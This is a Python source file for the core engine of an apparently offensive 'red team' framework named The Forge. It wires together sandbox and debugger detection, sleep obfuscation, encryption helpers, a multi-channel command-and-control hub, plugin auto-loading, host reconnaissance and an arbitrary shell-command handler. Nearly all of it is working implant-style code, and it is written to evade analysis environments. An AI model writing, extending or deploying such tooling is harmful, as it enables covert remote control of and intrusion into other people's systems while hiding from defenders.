"""
The Forge — Main Engine
Module loader, plugin registry, task runner, and CLI controller.
"""

import os
import sys
import json
import time
import importlib
import argparse
import traceback
from typing import Optional, Callable, Any
from datetime import datetime
from pathlib import Path

# Add parent to path for imports
FRAMEWORK_ROOT = Path(__file__).resolve().parent.parent
if str(FRAMEWORK_ROOT) not in sys.path:
    sys.path.insert(0, str(FRAMEWORK_ROOT))

from core.crypto import encrypt, decrypt, xor_encode, b64_encode, generate_key
from core.stealth import SandboxDetector, AntiDebug, full_stealth_check, SleepObfuscation
from core.c2_hub import C2Hub, create_multi_c2


# ---------------------------------------------------------------------------
# Plugin Registry
# ---------------------------------------------------------------------------

class PluginRegistry:
    """Auto-discovery and management of framework modules/plugins."""

    def __init__(self):
        self._plugins: dict[str, dict] = {}
        self._hooks: dict[str, list[Callable]] = {}

    def register(self, name: str, plugin_class: type, metadata: dict = None):
        """Register a plugin by name."""
        self._plugins[name] = {
            "class": plugin_class,
            "instance": None,
            "metadata": metadata or {},
            "loaded_at": datetime.now().isoformat(),
        }

    def get(self, name: str) -> Optional[Any]:
        """Get or instantiate a plugin."""
        if name not in self._plugins:
            return None
        entry = self._plugins[name]
        if entry["instance"] is None:
            entry["instance"] = entry["class"]()
        return entry["instance"]

    def list_plugins(self) -> list[dict]:
        """List all registered plugins with metadata."""
        return [
            {"name": name, **info["metadata"], "loaded": info["instance"] is not None}
            for name, info in self._plugins.items()
        ]

    def add_hook(self, event: str, callback: Callable):
        """Register an event hook."""
        if event not in self._hooks:
            self._hooks[event] = []
        self._hooks[event].append(callback)

    def trigger(self, event: str, *args, **kwargs):
        """Trigger all callbacks for an event."""
        for callback in self._hooks.get(event, []):
            try:
                callback(*args, **kwargs)
            except Exception as e:
                print(f"[!] Hook error ({event}): {e}")

    def auto_discover(self, modules_dir: str):
        """
        Auto-discover modules in a directory.
        Each module should have a `register(registry)` function.
        """
        modules_path = Path(modules_dir)
        if not modules_path.exists():
            return

        for item in modules_path.iterdir():
            if item.is_dir() and (item / "__init__.py").exists():
                try:
                    module_name = f"modules.{item.name}"
                    mod = importlib.import_module(module_name)
                    if hasattr(mod, "register"):
                        mod.register(self)
                except Exception as e:
                    print(f"[!] Failed to load module {item.name}: {e}")


# ---------------------------------------------------------------------------
# Task System
# ---------------------------------------------------------------------------

class Task:
    """Represents an executable task/command."""

    def __init__(self, task_id: str, action: str, params: dict = None):
        self.task_id = task_id
        self.action = action
        self.params = params or {}
        self.status = "pending"
        self.result = None
        self.error = None
        self.created_at = datetime.now()
        self.completed_at = None

    def to_dict(self) -> dict:
        return {
            "task_id": self.task_id,
            "action": self.action,
            "params": self.params,
            "status": self.status,
            "result": self.result,
            "error": self.error,
            "created_at": self.created_at.isoformat(),
            "completed_at": self.completed_at.isoformat() if self.completed_at else None,
        }


class TaskRunner:
    """Execute tasks with error handling and logging."""

    def __init__(self):
        self._handlers: dict[str, Callable] = {}
        self._history: list[Task] = []

    def register_handler(self, action: str, handler: Callable):
        """Register a handler function for a task action."""
        self._handlers[action] = handler

    def execute(self, task: Task) -> Task:
        """Execute a task and return the updated task."""
        handler = self._handlers.get(task.action)
        if not handler:
            task.status = "error"
            task.error = f"Unknown action: {task.action}"
            return task

        try:
            task.status = "running"
            task.result = handler(**task.params)
            task.status = "completed"
        except Exception as e:
            task.status = "error"
            task.error = f"{type(e).__name__}: {str(e)}"
            task.result = traceback.format_exc()

        task.completed_at = datetime.now()
        self._history.append(task)
        return task

    def get_history(self) -> list[dict]:
        return [t.to_dict() for t in self._history]


# ---------------------------------------------------------------------------
# The Forge Engine
# ---------------------------------------------------------------------------

class ForgeEngine:
    """
    Main orchestrator for The Forge framework.
    Manages plugins, tasks, C2 communications, and stealth operations.
    """

    BANNER = """
    ================================================
    |                                              |
    |                THE FORGE                     |
    |          Red Team Framework - v1.0           |
    |                                              |
    |         "We don't knock. We own."            |
    |                                              |
    ================================================
    """

    def __init__(self, config_path: Optional[str] = None):
        self.registry = PluginRegistry()
        self.task_runner = TaskRunner()
        self.c2: Optional[C2Hub] = None
        self.config = self._load_config(config_path)
        self._setup_builtin_handlers()

    def _load_config(self, config_path: Optional[str]) -> dict:
        """Load engine configuration."""
        if config_path and os.path.exists(config_path):
            with open(config_path) as f:
                return json.load(f)
        return {
            "stealth_check": True,
            "auto_discover_modules": True,
            "log_level": "info",
            "beacon_interval": 30,
            "jitter": 0.3,
        }

    def _setup_builtin_handlers(self):
        """Register built-in task handlers."""
        self.task_runner.register_handler("stealth_check", lambda: full_stealth_check())
        self.task_runner.register_handler("list_plugins", lambda: self.registry.list_plugins())
        self.task_runner.register_handler("status", self._handle_status)
        self.task_runner.register_handler("shell", self._handle_shell)
        self.task_runner.register_handler("encrypt", self._handle_encrypt)
        self.task_runner.register_handler("decrypt", self._handle_decrypt)
        self.task_runner.register_handler("info", self._handle_info)

    def _handle_status(self) -> dict:
        """Get the current status of the engine and C2 as a dict."""
        return {
            "modules_loaded": len(self.registry.list_plugins()),
            "tasks_executed": len(self.task_runner.get_history()),
            "c2_channels": self.c2.get_status() if self.c2 else "Not configured"
        }

    @staticmethod
    def _handle_shell(command: str = "whoami") -> str:
        """Execute a shell command and return output."""
        import subprocess
        try:
            result = subprocess.run(
                command, shell=True, capture_output=True, text=True, timeout=30
            )
            return result.stdout + result.stderr
        except subprocess.TimeoutExpired:
            return "[!] Command timed out"
        except Exception as e:
            return f"[!] Error: {e}"

    @staticmethod
    def _handle_encrypt(data: str = "", password: str = "forge") -> str:
        """Encrypt data with password."""
        encrypted = encrypt(data.encode(), password)
        return b64_encode(encrypted)

    @staticmethod
    def _handle_decrypt(data: str = "", password: str = "forge") -> str:
        """Decrypt data with password."""
        from core.crypto import b64_decode
        raw = b64_decode(data)
        return decrypt(raw, password).decode()

    @staticmethod
    def _handle_info() -> dict:
        """Get system information."""
        import platform
        return {
            "hostname": platform.node(),
            "os": platform.system(),
            "os_version": platform.version(),
            "arch": platform.machine(),
            "python": platform.python_version(),
            "user": os.environ.get("USERNAME", os.environ.get("USER", "unknown")),
            "cwd": os.getcwd(),
            "pid": os.getpid(),
        }

    def initialize(self, skip_stealth: bool = False):
        """
        Initialize the engine:
        1. Run stealth checks (optional)
        2. Auto-discover modules
        3. Initialize C2 if configured
        """
        print(self.BANNER)

        # Stealth gate
        if not skip_stealth and self.config.get("stealth_check"):
            print("[*] Running stealth checks...")
            report = full_stealth_check()
            if not report["safe_to_proceed"]:
                print("[!] WARNING: Hostile environment detected!")
                print(f"    Sandbox score: {report['sandbox']['score']}/9")
                print(f"    Debugger: {report['debugger_attached']}")
                print("[!] Proceeding with caution...")
            else:
                print("[+] Environment is clean.")

        # Module discovery
        if self.config.get("auto_discover_modules"):
            modules_dir = str(FRAMEWORK_ROOT / "modules")
            print(f"[*] Discovering modules in: {modules_dir}")
            self.registry.auto_discover(modules_dir)
            plugins = self.registry.list_plugins()
            print(f"[+] Loaded {len(plugins)} modules.")

        # C2 setup
        c2_configs = self.config.get("c2_channels", [])
        if c2_configs:
            print("[*] Setting up C2 channels...")
            self.c2 = create_multi_c2(c2_configs)
            status = self.c2.connect_all()
            for name, connected in status.items():
                sym = "+" if connected else "!"
                print(f"  [{sym}] {name}: {'Connected' if connected else 'Failed'}")

        print("[+] The Forge is ready.")
        self.registry.trigger("engine_initialized")

    def run_task(self, action: str, **params) -> dict:
        """Create and execute a task."""
        task_id = f"task_{int(time.time())}_{os.urandom(4).hex()}"
        task = Task(task_id, action, params)
        result = self.task_runner.execute(task)
        return result.to_dict()

    def interactive(self):
        """Start interactive CLI shell."""
        print("\n[*] Interactive mode. Type 'help' for commands, 'exit' to quit.\n")

        while True:
            try:
                cmd = input("forge> ").strip()
                if not cmd:
                    continue

                if cmd == "exit":
                    print("[*] Shutting down The Forge...")
                    break
                elif cmd == "help":
                    self._print_help()
                elif cmd == "status":
                    self._print_status()
                elif cmd == "plugins":
                    for p in self.registry.list_plugins():
                        print(f"  [{'+' if p['loaded'] else '-'}] {p['name']}")
                elif cmd.startswith("shell "):
                    result = self.run_task("shell", command=cmd[6:])
                    print(result.get("result", result.get("error", "")))
                elif cmd == "stealth":
                    result = self.run_task("stealth_check")
                    self._pretty_print(result["result"])
                elif cmd == "info":
                    result = self.run_task("info")
                    self._pretty_print(result["result"])
                elif cmd.startswith("encrypt "):
                    parts = cmd[8:].split(" ", 1)
                    pwd = parts[0] if len(parts) > 1 else "forge"
                    data = parts[1] if len(parts) > 1 else parts[0]
                    result = self.run_task("encrypt", data=data, password=pwd)
                    print(result.get("result", result.get("error", "")))
                elif cmd == "history":
                    for t in self.task_runner.get_history():
                        status_sym = "✓" if t["status"] == "completed" else "✗"
                        print(f"  [{status_sym}] {t['task_id']} → {t['action']} ({t['status']})")
                elif cmd == "banner":
                    print(self.BANNER)
                else:
                    print(f"[?] Unknown command: {cmd}. Type 'help' for list.")

            except KeyboardInterrupt:
                print("\n[*] Use 'exit' to quit.")
            except EOFError:
                break

    def _print_help(self):
        help_text = """
  -----------------------------------------------
  |              THE FORGE - COMMANDS            |
  -----------------------------------------------
  |  help          Show this help menu           |
  |  status        Show engine & C2 status       |
  |  plugins       List loaded plugins           |
  |  shell <cmd>   Execute shell command         |
  |  stealth       Run stealth/sandbox checks    |
  |  info          System information            |
  |  encrypt <d>   Encrypt data                  |
  |  history       Show task history             |
  |  banner        Show banner                   |
  |  exit          Shutdown the engine           |
  -----------------------------------------------
        """
        print(help_text)

    def _print_status(self):
        print("\n  === ENGINE STATUS ===")
        print(f"  Modules loaded: {len(self.registry.list_plugins())}")
        print(f"  Tasks executed: {len(self.task_runner.get_history())}")
        if self.c2:
            print("\n  === C2 CHANNELS ===")
            for name, info in self.c2.get_status().items():
                primary = " [PRIMARY]" if info["is_primary"] else ""
                status = "🟢" if info["active"] else "🔴"
                print(f"  {status} {name}{primary} — Last: {info['last_checkin']}")
        else:
            print("  C2: Not configured")
        print()

    @staticmethod
    def _pretty_print(data):
        if isinstance(data, dict):
            for k, v in data.items():
                if isinstance(v, dict):
                    print(f"  {k}:")
                    for k2, v2 in v.items():
                        print(f"    {k2}: {v2}")
                else:
                    print(f"  {k}: {v}")
        else:
            print(f"  {data}")


# ---------------------------------------------------------------------------
# CLI Entry Point
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        description="The Forge — Red Team Framework Engine",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="Example: python engine.py --interactive --skip-stealth"
    )
    parser.add_argument("--config", "-c", help="Path to config JSON file")
    parser.add_argument("--interactive", "-i", action="store_true", help="Start interactive mode")
    parser.add_argument("--skip-stealth", action="store_true", help="Skip stealth checks")
    parser.add_argument("--task", "-t", help="Run a single task (action name)")
    parser.add_argument("--params", "-p", help="Task parameters as JSON string")
    parser.add_argument("--quiet", "-q", action="store_true", help="Minimal output")

    args = parser.parse_args()

    engine = ForgeEngine(config_path=args.config)
    engine.initialize(skip_stealth=args.skip_stealth)

    if args.task:
        params = json.loads(args.params) if args.params else {}
        result = engine.run_task(args.task, **params)
        if not args.quiet:
            print(json.dumps(result, indent=2, default=str))
    elif args.interactive:
        engine.interactive()
    else:
        engine.interactive()  # Default to interactive


if __name__ == "__main__":
    main()
